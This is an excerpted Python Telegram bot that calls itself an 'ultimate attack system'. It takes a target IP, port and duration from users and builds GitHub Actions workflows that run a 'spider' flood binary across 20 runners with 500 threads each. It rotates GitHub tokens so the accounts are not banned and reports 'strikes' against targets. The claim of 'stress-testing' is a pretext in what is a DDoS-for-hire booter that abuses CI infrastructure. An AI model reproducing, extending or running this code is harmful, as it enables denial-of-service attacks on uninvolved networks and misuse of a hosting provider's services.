...
pending_users = {}
attack_counters = {}
user_cooldown = {}        # NEW: per-user cooldown
token_index = 0           # NEW: round-robin token selector
...
# ============================================================
# ===== 🔥 ULTIMATE POWER ATTACK WITH COOLDOWN & TOKEN ROTATION =====
# ============================================================
...
async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        if time.time() - last < 30:
            await update.message.reply_text("⏳ <b>Chill bro!</b> Wait 30 seconds between attacks.", parse_mode='HTML')
            return
        ...
        # --- ROUND-ROBIN TOKEN SELECTION (distributes load) ---
        token_data = github_tokens[token_index % len(github_tokens)]
        token_index += 1
        ...
        # ============================================================
        # 🚀 ULTIMATE POWER: 20 RUNNERS × 500 THREADS = 10,000 TOTAL
        # ============================================================
...
jobs:
  attack:
    ...
    - name: System Tuning (Max Network & CPU)
      run: |
        ...
        ulimit -n 999999
    - name: Execute Spider Attack
      run: |
        chmod +x spider
        sudo nice -n -20 ./spider {ip} {port} {time_val} 500 || sudo nice -n -20 ./spider {ip} {port} {time_val} 500
"""
        try:
        ...
        # GENZ PROFESSIONAL OUTPUT (UPDATED POWER DISPLAY)
        ...
        message = (
            f"<b>⚡ ULTIMATE ATTACK DEPLOYED – 10,000 THREADS ⚡</b>\n\n"
            f"<pre>\n"
            f"┌─────────────────────────────────────────────────┐\n"
            f"│  🎯 TARGET          │  {ip}:{port}                  │\n"
            f"│  ⏱️ DURATION        │  {time_val}s                       │\n"
            f"│  ⚙️ ARCHITECTURE    │  20 Parallel Runners      │\n"
            f"│  🧵 CONCURRENCY     │  500 Threads / Runner     │\n"
            f"│  🔥 TOTAL LOAD      │  10,000 Concurrent Threads │\n"
            f"│  📁 REPOSITORY      │  {repo_name}  │\n"
            f"│  👤 TOKEN HOLDER    │  @{token_data['username']}                    │\n"
            ...
            f"🛑 <b>Abort:</b> Use <code>/stop</code> to terminate this strike.\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>🚀 Strike #{attack_counters.get(str(user_id), 0)} launched. Token rotation active – no burn!</i>"
        )
...
async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ...
        total_threads = len(active_attacks) * 10000
        msg = "<b>📡 LIVE FEED – ACTIVE RAIDS (ULTIMATE POWER)</b>\n\n"
        msg += "<pre>\n"
        msg += "┌─────────────────────────────────────────────────┐\n"
        ...
        msg += "└─────────────────────────────────────────────────┘\n"
        msg += "</pre>\n"
        msg += f"<i>🛑 Use /stop to abort all missions. 10K threads per attack!</i>"
        await update.message.reply_text(msg, parse_mode='HTML')
...
# ============================================================
# ===== START COMMAND (UPDATED POWER DISPLAY) =====
# ============================================================
...
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ...
        if can_attack(user_id):
            ...
            await update.message.reply_text(
                f"<b>🔥 ARMADA – ULTIMATE ATTACK SYSTEM</b>\n\n"
                f"<pre>\n"
                f"┌─────────────────────────────────────────────┐\n"
                f"│  👤 OPERATOR    :  @{username:<12}     │\n"
                f"│  🎯 ROLE        :  {'👑 OWNER' if is_owner(user_id) else '✅ APPROVED':<12} │\n"
                f"│  ⚙️ WORKERS     :  20 Parallel           │\n"
                f"│  🧵 THREADS     :  500 / Worker          │\n"
                f"│  🔥 TOTAL LOAD  :  10,000 Threads       │\n"
                f"│  📡 STATUS      :  🟢 ONLINE            │\n"
...
async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>🤖 ARMADA – ULTIMATE ATTACK SYSTEM</b>\n\n"
        "⚡ <b>Version:</b> 3.0 (ULTIMATE POWER EDITION)\n"
        "👨‍💻 <b>Built with:</b> Python, Pyrogram, GitHub Actions\n"
        "🔥 <b>Architecture:</b> 20 Parallel Runners × 500 Threads = 10,000 Concurrent\n"
        "🛡️ <b>Token Safety:</b> Round‑Robin selection + Per‑user cooldown\n"
        "🎯 <b>Purpose:</b> Maximum stress‑testing & network resilience\n"
        "💬 <b>Motto:</b> \"Speed. Precision. Dominance. 20× Power. Tokens safe.\"\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
...
def main():
    try:
        ...
        logger.info("🚀 ULTIMATE ARMADA is ONLINE – 20× POWER + TOKEN SAFE!")
        logger.info("⚙️ 20 Runners × 500 Threads = 10,000 Concurrent")
        logger.info("🔄 Round-Robin Token Rotation + 30s Cooldown Active")
